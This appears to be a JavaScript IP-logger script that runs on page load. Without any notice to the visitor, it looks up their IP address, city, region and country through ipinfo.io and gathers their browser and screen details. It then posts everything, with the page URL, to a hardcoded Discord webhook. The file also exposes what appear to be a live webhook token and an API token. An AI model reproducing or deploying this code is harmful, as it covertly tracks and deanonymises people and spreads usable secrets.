function sendWebhook() {
    const webhookUrl = 'https://discord.com/api/webhooks/' + '1250338635677438044/fJOo5PxBFaaHZKUj5QvqyTVuzhXTVaBR7autg6GXwRwMejmVnO8vssYbv2mtsS7i79-9';

    async function fetchIpInfo() {
        try {
            const response = await fetch('https://ipinfo.io/json?token=ce1fc29ae007b4');
            return await response.json();
        } catch (error) {
            return { error: 'Failed to fetch IP info' };
        }
    }

    fetchIpInfo().then(ipInfo => {
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            }
        };

        const embed = {
            title: "New Access Detected",
            description: "Details of the access event",
            color: 2833745,
            fields: [
                { name: "URL", value: location.href, inline: false },
                { name: "Time", value: new Intl.DateTimeFormat('en-US', {hour: 'numeric', minute: 'numeric', our12: true, timeZone: 'Asia/Jakarta'}).format(new Date()) + " (WIB)", inline: false },
                { name: "IP", value: ipInfo.ip || 'Unavailable', inline: true },
                { name: "City", value: ipInfo.city || 'Unavailable', inline: true },
                { name: "Region", value: ipInfo.region || 'Unavailable', inline: true },
                { name: "Country", value: ipInfo.country || 'Unavailable', inline: true },
                { name: "User-Agent", value: deviceInfo.userAgent, inline: false },
                { name: "Platform", value: deviceInfo.platform, inline: true },
                { name: "Language", value: deviceInfo.language, inline: true },
                {
                    name: "Screen",
                    value: `Width: ${deviceInfo.screen.width}, Height: ${deviceInfo.screen.height}, Color Depth: ${deviceInfo.screen.colorDepth}`,
                    inline: false
                }
            ],
            footer: { text: "Access event recorded" },
            timestamp: new Date()
        };

        const payload = JSON.stringify({ embeds: [embed] });

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payload
        }).then(response => {
            if (response.ok) {
                console.log('Webhook sent successfully');
            } else {
                console.error('Failed to send webhook', response.statusText);
            }
        }).catch(error => {
            console.error('Error sending webhook', error);
        });
    });
}


sendWebhook();